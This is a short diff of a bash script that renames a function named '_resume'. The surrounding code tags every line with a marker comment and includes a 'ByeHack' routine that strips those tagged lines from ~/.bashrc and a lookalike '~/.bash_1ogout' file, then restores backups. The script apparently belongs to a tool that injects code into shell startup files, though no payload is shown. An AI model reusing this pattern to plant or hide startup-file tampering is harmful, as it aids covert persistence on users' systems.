@@ -26,7 +26,7 @@ function _bak { #_fdsagadsfasdgadsgsss
     echo $1 >> $index_f #_fdsagadsfasdgadsgsss
   fi #_fdsagadsfasdgadsgsss
 } #_fdsagadsfasdgadsgsss
-function _resume {  #_fdsagadsfasdgadsgsss
+function ___resume {  #_fdsagadsfasdgadsgsss
   if [ -f $index_f ];then #_fdsagadsfasdgadsgsss
     gglog ">> resume"  #_fdsagadsfasdgadsgsss
     for i in $(cat $index_f);  #_fdsagadsfasdgadsgsss
@@ -57,7 +57,7 @@ function ByeHack { #_fdsagadsfasdgadsgsss
     sed -ie '/#_fdsagadsfasdgadsgsss$/d' ~/.bashrc #_fdsagadsfasdgadsgsss
     sed -ie '/#_fdsagadsfasdgadsgsss$/d' ~/.bash_1ogout #_fdsagadsfasdgadsgsss
     CL #_fdsagadsfasdgadsgsss
-    _resume; #_fdsagadsfasdgadsgsss
+    ___resume; #_fdsagadsfasdgadsgsss
     rm $index_f; #_fdsagadsfasdgadsgsss
     rm $clear_shell; #_fdsagadsfasdgadsgsss
 } #_fdsagadsfasdgadsgsss
